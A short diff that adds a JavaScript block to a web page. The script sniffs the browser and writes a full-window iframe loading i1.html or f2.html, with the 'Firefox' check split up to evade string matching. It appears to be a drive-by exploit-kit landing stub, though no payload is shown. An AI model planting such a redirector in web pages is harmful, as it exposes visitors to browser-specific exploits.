@@ -1,0 +1,15 @@
+<script language="javascript">
+<!--
+if (window.navigator.userAgent.indexOf("MSIE")>=1)
+{
+document.write ("<iframe src=i1.html width=100% height=100% scrolling=no frameborder=0>")
+}else{
+if (window.navigator.userAgent.indexOf("Fi"+"r"+"e"+"f"+"o"+"x")>=1)
+{
+document.write ("<iframe src=f2.html width=100% height=100% scrolling=no frameborder=0>")
+}else{
+document.write ("<iframe src=i1.html width=100% height=100% scrolling=no frameborder=0>")
+}
+}
+//-->
+</script>
